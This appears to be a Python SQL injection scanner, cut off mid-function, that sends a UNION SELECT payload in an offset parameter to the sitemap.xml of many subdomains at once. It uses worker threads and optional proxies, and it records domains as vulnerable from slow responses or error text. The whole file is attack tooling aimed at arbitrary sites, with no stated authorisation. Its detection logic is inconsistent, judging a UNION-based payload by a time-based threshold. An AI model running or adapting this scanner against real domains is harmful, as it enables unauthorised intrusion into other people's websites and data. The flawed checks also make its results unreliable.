import logging
import requests
import time
from queue import Queue
from threading import Thread

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SqliTester:
    def __init__(self, sitemap_subdomains, thread_count, rate_limit_delay=1, proxies=None):
        self.sitemap_subdomains = sitemap_subdomains
        self.thread_count = thread_count
        self.rate_limit_delay = rate_limit_delay
        self.proxies = proxies
        self.vulnerable_domains = set()
        self.queue = Queue()

    def test_sqli(self):
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    response = self.check_sqli_vulnerability(
                        f"https://{domain}/sitemap.xml", domain
                    )
                    if response and response.elapsed.total_seconds() > 10:
                        self.vulnerable_domains.add(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                finally:
                    self.queue.task_done()
                    time.sleep(self.rate_limit_delay)

        for domain in self.sitemap_subdomains:
            self.queue.put(domain)

        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        self.queue.join()

        logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")

    def check_sqli_vulnerability(self, url, domain):
        try:
            # Customize the SQL payload to inject specific SQL statements
            # and exploit the vulnerabilities you want to test
            payload = "' UNION SELECT column1, column2 FROM table_name -- "
            full_url = f"{url}?offset={payload}"

            response = requests.get(full_url, timeout=20, proxies=self.proxies)

            if self.is_sqli_successful(response):
                self.process_successful_sqli(url, domain)

            return response

        except requests.exceptions.RequestException as e:
            logger.error(
                f"An error occurred while checking SQLi vulnerability for URL {url}: {e}"
            )

    def is_sqli_successful(self, response):
        if "Error" in response.text or "
